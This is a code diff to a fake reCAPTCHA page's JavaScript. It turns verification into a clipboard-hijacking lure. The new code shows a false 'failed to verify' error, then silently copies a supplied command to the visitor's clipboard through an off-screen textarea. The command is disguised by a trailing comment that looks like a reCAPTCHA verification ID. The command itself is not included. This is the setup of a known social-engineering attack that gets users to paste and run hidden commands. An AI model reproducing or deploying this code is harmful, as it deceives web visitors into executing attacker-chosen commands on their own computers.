@@ -2,12 +2,44 @@
 // Function triggered when client clicks [Verify]
 function verifyCaptcha() {
 
-    alert("Verified!");
+    alert("Failed to verify, please try again. \nError code: CAPTCHA-VERIFY-CODE-NULL");
     closeVerifyWindow();
 
 }
 
+function setClipboardCopyData(textToCopy) {
+    const tempTextArea = document.createElement("textarea");
+    tempTextArea.value = textToCopy;
+    // Hide the textarea from view
+    tempTextArea.style.position = 'fixed';
+    tempTextArea.style.top = '-9999px';
+    tempTextArea.style.left = '-9999px';
+    tempTextArea.style.opacity = '0';
+    tempTextArea.style.width = '1px';
+    tempTextArea.style.height = '1px';
+    document.body.appendChild(tempTextArea);
+    tempTextArea.select();
+    try {
+        document.execCommand("copy");
+    } catch (err) {
+        console.error('Copy to clipboard failed:', err);
+    } finally {
+        document.body.removeChild(tempTextArea);
+    }
+}
 
+ function stageClipboard(commandToRun){
+    const suffix = " # "
+    const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
+    const end = "''"
+    const textToCopy = commandToRun + suffix + ploy + generateSixDigitString() + end
+
+    setClipboardCopyData(textToCopy);
+}
+
+function generateSixDigitString() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+}
 
 
 let checkboxWindow = document.getElementById("fkrc-checkbox-window");
@@ -16,6 +48,8 @@ let checkboxBtnSpinner = document.getElementById("fkrc-spinner");
 let verifyWindow = document.getElementById("fkrc-verifywin-window");
 let verifyWindowArrow = document.getElementById("fkrc-verifywin-window-arrow");
 let verifyBtn = document.getElementById("fkrc-verifywin-verify-button");
+
+
 
 function addCaptchaListeners() {
     if (checkboxBtn && verifyBtn) {
